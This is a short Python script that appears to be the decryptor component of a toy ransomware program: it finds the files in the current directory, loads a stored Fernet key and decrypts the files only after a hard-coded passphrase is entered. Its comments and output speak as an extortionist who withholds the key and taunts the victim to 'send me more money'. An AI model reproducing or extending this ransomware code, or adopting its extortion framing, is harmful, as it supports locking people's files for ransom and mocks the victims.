#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Add files to the list
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Printing every file on current directory
print(files)

# Opening the stored key
with open("thekey.key", "rb") as key:
    secretkey = key.read()

# We can't just give them a key for free!! Here we are requiring a password to
# unlock the ability to decrypt their files

# Requiring a password in order to decrypt files.
secret_phrase = "supersecretpassword"

user_phrase = input("Enter the secret phrase to decrypt your files\n> ")

# Decrypting the files if the passphrase is correct
if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Congratz lul, your files are decrypted.")
else:
    print("Wrong secret phrase. Now send me more money, lmao")
